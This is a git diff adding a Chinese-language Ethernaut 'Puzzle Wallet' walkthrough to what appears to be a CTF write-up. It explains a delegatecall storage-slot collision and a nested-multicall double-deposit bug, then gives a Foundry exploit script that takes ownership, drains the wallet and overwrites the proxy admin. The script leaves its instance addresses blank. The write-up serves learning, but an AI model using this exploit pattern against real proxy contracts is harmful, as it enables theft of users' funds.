@@ -475,3 +475,40 @@ cast send "instance" "swap(address,address,uint256)" "MyToken" "token2" 200
 另外，我本来打算用console做这题的。结果报错：`Transaction was not mined within 50 blocks, please make sure your transaction was properly sent. Be aware that it might still be mined!`，跑去用foundry也报错:`server returned an error response: error code -32000: replacement transaction underpriced`
 
 解决办法是等一会，一段时间后foundry就不再报错了（估计是原交易被刷掉了）
+
+## Puzzle Wallet
+
+看了一圈，发现根本无法调用PuzzleWallet中的任何函数，因为基本都有onlyWhitelisted或者其他的限制。PuzzleProxy里倒是有个proposeNewAdmin函数，但是PuzzleProxy这个合约在哪？
+
+完全不知道怎么开始，只能看答案： https://blog.dixitaditya.com/ethernaut-level-24-puzzle-wallet 。看起来PuzzleProxy和PuzzleWallet在同一个地址？根据UpgradeableProxy的[源码](https://github.com/fractional-company/contracts/blob/master/src/OpenZeppelin/proxy/UpgradeableProxy.sol)，所谓Proxy指的是将交互和具体实现分开的架构。用户和Proxy交互时，Proxy用delegatecall调用实现层合约的相应函数。“Upgradeable”指的是可以更改指定的实现层合约
+
+`PuzzleWallet(address(proxy))`指的是用PuzzleWallet定义的函数API与`address(proxy)`这个地址进行交互。由于proxy并不具备PuzzleWallet的api，所以调用会走到proxy的fallback函数。proxy的fallback函数里再使用deletegatecall调用PuzzleWallet的api。给人的体验很像是“PuzzleProxy的地址等于PuzzleWallet的地址”，实际上不可能有两个合约在同一个地址
+
+这题同样存在deletegatecall相关的漏洞。PuzzleProxy的slot 0、1分别是pendingAdmin和admin；而PuzzleWallet的slot 0、1分别是owner和maxBalance。因为是proxy使用deletegatecall调用wallet的函数，所以wallet读取和修改的storage其实是proxy的。于是我们可以用`proposeNewAdmin`修改proxy的pendingAdmin，后续wallet读取owner时读到的便是pendingAdmin的值。借此我们可以变成wallet的owner，从而调用addToWhitelist绕过onlyWhitelisted
+
+非常可惜execute函数中不存在re-entrancy。multicall用depositCalled防止攻击者用同一个`msg.value`多次调用deposit函数。然而depositCalled是一个本地变量，如果攻击者用multicall再调用一次multicall，第二次调用的multicall的depositCalled就变回false了；允许攻击者用相同的`msg.value`再次调用deposit
+
+利用上述multicall中的漏洞清空wallet的balance后就能用setMaxBalance修改maxBalance参数，即proxy中的admin参数了
+```solidity
+contract AttackScript is Script {
+    function run() public {
+        vm.startBroadcast();
+        PuzzleProxy pp=PuzzleProxy();
+        PuzzleWallet pw=PuzzleWallet();
+        pp.proposeNewAdmin(msg.sender);
+        pw.addToWhitelist(msg.sender);
+        bytes[] memory depositCall = new bytes[](1);
+        depositCall[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
+        bytes[] memory multicallData = new bytes[](2);
+        multicallData[0] = abi.encodeWithSelector(PuzzleWallet.deposit.selector);
+        multicallData[1] = abi.encodeWithSelector(
+            PuzzleWallet.multicall.selector,
+            depositCall
+        );
+        pw.multicall{value: 0.001 ether}(multicallData);
+        pw.execute(msg.sender,0.002 ether,"");
+        pw.setMaxBalance(uint256(uint160(msg.sender)));
+        vm.stopBroadcast();
+    }
+}
+```
